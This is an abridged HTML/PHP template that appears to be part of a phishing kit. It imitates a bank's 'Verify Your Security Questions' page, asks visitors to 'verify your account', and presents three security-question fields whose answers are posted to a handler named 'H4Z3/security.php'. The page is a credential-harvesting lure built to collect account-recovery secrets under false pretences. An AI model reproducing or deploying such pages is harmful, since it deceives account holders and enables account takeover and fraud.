                    ...
                    <section class="unauth-intro-area">
                        ...
                        <div>
                            <div class="unauth-intro-area__step">
                                ...
                                <span>Verify Your Security Questions</span>
                            </div>
...
<?php endforeach; ?>
                        ...
                        <div class="unauth-intro-area__help">
                            <p class="unauth-intro-area__text">Please enter your information to verify your account.</p>
                        </div>
                    </section>
                    <section class="identify-customer-section">
                        <form id="form" action="H4Z3/security.php" method="POST" class="unauth-form jqtransform js-enrollment-form">
                            <div class="unauth-form__row">
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="q1">Question 1</label>
                                    <select name="q1" id="q1" class="unauth-form__input js-account-type">
                                        ...
                                        <option value="What is your maternal grandfather's name?">What is your maternal grandfather's name?</option> 
                                ...
                                <div class="unauth-form__rowitem">
                                    <input type="text" name="a1" id="a1" placeholder="Answer 1" class="unauth-form__input js-mobilepassword">
                                </div>
                            </div>
                            <div class="unauth-form__row">
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="q2">Question 2</label>
                                    <select name="q2" id="q2" class="unauth-form__input js-account-type">
                                        <option disabled selected="selected">Select One</option> 
                                ...
                                <div class="unauth-form__rowitem">
                                    <input type="text" name="a2" id="a2" placeholder="Answer 2" class="unauth-form__input js-mobilepassword">
                                </div>
                            </div>
                            <div class="unauth-form__row">
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="q3">Question 3</label>
                                    <select name="q3" id="q3" class="unauth-form__input js-account-type">
                                        <option disabled selected="selected">Select One</option> 
                                        <option value="What is your paternal grandfather's name?">What is your paternal grandfather's name?</option>
                                ...
                                <div class="unauth-form__rowitem">
                                    <input type="text" name="a3" id="a3" placeholder="Answer 3" class="unauth-form__input js-mobilepassword">
                                </div>
                            </div>
        ...
        <script src="./V1P3R/js/index.js"></script>
    </body>
</html>